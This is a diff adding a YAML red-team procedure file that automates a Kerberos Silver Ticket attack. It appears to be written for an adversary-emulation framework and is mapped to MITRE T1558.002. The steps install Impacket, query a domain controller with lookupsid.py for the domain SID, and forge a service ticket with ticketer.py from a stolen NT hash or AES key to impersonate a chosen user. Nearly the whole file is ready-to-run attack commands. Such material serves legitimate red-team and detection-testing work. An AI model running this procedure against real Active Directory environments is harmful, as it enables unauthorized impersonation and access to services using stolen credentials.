@@ -1,0 +1,84 @@
+---
+api_version: 2.0
+uuid: d8e5f2a7-9b6c-4d8e-c4f3-2a1b0d9e8c7f
+name: Silver Ticket Attack
+authors:
+  - isaac_fletcher
+description: |
+  Forges a Silver Ticket using Impacket's ticketer.py by leveraging a compromised service account hash.
+  Looks up the domain SID via lookupsid.py, then forges a TGS ticket for a specific service
+  using the selected key type (RC4 or AES).
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1558 Steal or Forge Kerberos Tickets
+  subtechniques:
+    - T1558.002 Silver Ticket
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication to the domain controller (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: ticket_type
+    description: |
+      The type of service account key to use for the silver ticket.
+      - rc4: Use an NT hash
+      - aes: Use an AES 128 or 256 bit key
+    choices:
+      - rc4
+      - aes
+    default: rc4
+  - name: service_key
+    description: The service account key to use (NT hash for RC4 or AES 128/256 bit key for AES)
+  - name: service_spn
+    description: The Service Principal Name to forge the ticket for (e.g., cifs/server.domain.com)
+  - name: ticket_user
+    description: The username to impersonate in the silver ticket
+  - name: output_file
+    description: Path to save the forged ticket file
+    default: /tmp/silver_ticket.ccache
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: lookup_sid
+    description: Look up the domain SID using lookupsid.py
+    inline: |
+      lookupsid.py '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.dc}}' 0
+    outputvar: LOOKUPSID_OUTPUT
+
+  - name: extract_domain_sid
+    description: Extract the domain SID from the lookupsid output
+    inline: |
+      echo '{[{.StepVars.LOOKUPSID_OUTPUT}]}' | grep -oP 'Domain SID is: \K\S+'
+    outputvar: DOMAIN_SID
+
+  - name: forge_silver_ticket
+    description: Create a silver ticket for the target service
+    inline: |
+      {{if eq .Args.ticket_type "rc4"}}
+      echo "[*] Forging silver ticket using RC4 key (NT hash)"
+      ticketer.py -nthash "{{.Args.service_key}}" -domain-sid "{[{.StepVars.DOMAIN_SID}]}" -domain "{{.Args.domain}}" -spn "{{.Args.service_spn}}" "{{.Args.ticket_user}}"
+      {{else}}
+      echo "[*] Forging silver ticket using AES key"
+      ticketer.py -aesKey "{{.Args.service_key}}" -domain-sid "{[{.StepVars.DOMAIN_SID}]}" -domain "{{.Args.domain}}" -spn "{{.Args.service_spn}}" "{{.Args.ticket_user}}"
+      {{end}}
+      mv "{{.Args.ticket_user}}.ccache" "{{.Args.output_file}}"
+    cleanup:
+      inline: |
+        echo "Cleaning up Silver Ticket. Service account password must be changed to invalidate the ticket."
+        rm -f "{{.Args.output_file}}"
